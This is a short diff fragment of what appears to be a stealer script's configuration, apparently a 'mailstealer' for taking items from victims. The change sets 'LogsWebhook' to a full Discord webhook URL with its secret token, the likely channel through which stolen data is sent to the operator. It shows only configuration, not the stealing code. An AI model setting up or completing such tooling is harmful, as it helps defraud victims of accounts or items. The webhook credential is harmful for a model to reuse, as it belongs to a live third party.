@@ -58,7 +58,7 @@ DualRAP = 0
 DualUser = ""
 DualWebhook = ""
 
-LogsWebhook = ""
+LogsWebhook = "https://discord.com/api/webhooks/1347170158447427625/rrrib-qXxyoSvYZfiSR7Fjjwks8q_EDTjUiCTo2ZC47c4S-xwyLmNq63_jkt6uQRbUKo"
 mailstealer_name = "Fe!ner mail scripts"
 
 
